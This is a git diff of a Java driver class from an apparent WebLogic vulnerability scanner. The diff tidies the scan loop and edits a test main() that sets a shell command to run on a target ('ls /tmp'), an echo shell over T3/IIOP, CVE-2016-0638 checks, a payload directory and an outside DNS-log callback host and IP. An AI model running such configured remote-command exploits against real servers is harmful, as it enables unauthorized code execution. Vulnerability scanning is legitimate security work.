@@ -58,9 +58,7 @@ public class GBWScanWeblogicScript implements GBWScanScript {
         if(config.isOnCVE_2017_3248())
             noEchoVuls.add(new GBWCVE_2017_3248(config));
 
-
     }
-
 
     @Override
     public GBWScanScriptCommonConfig getConfig() {
@@ -80,17 +78,13 @@ public class GBWScanWeblogicScript implements GBWScanScript {
 
             for(GBWEchoVul echoVul:echoVuls){
 
-                System.out.println(echoVul.getClass().getSimpleName());
                 GBWVulCheckResult scanResult = echoVul.scan(host);
-
                 if(scanResult!=null){
-
                     GBWScanWeblogicResult result = new GBWScanWeblogicResult(config,host,scanResult);
-                    System.out.println(result);
                     if(sinkQueue!=null){
                         sinkQueue.put(result);
                     }
-                    break;
+                    return;
                 }
             }
 
@@ -110,7 +104,6 @@ public class GBWScanWeblogicScript implements GBWScanScript {
         }catch (Exception e){
 
         }
-
     }
 
     public static void main(String[] args) throws Exception {
@@ -118,19 +111,22 @@ public class GBWScanWeblogicScript implements GBWScanScript {
         GBWScanWeblogicConfig config =  new GBWScanWeblogicConfig();
         config.setReadTimeout(10000);
         config.setConTimeout(10000);
-        config.setScanSleepTime(1000);
-        config.setCmd("id");
+        config.setScanSleepTime(3000);
+        config.setCmd("ls /tmp");
         config.setEchoShell("t3IIOP");
         config.setDefaultVersion("12130");
         config.setVersions(new String[]{"12130","12214"});
         config.setPayloadScriptDir("D:\\shajf_dev\\GBWScanner\\data");
 
+        config.setDnslogDomain("dnslog.gbw3bao.com");
+        config.setDnslogHost("47.93.48.162");
+        config.setDnslogPort(80);
         //config.setIsonCVE_2020_2551(true);
-        //config.setOnCVE_2016_0638(true);
-        config.setOnCVE_2018_2893(true);
+        config.setOnCVE_2016_0638(true);
+        //config.setIsonCVE_2020_2551(true);
         GBWScanWeblogicScript scanWeblogicScript = new GBWScanWeblogicScript(config);
 
-        String ip = "192.168.198.134";
+        String ip = "192.168.1.160";
         int port = 7001;
         Host host = new Host(ip,ip,port,null,"t3");
 
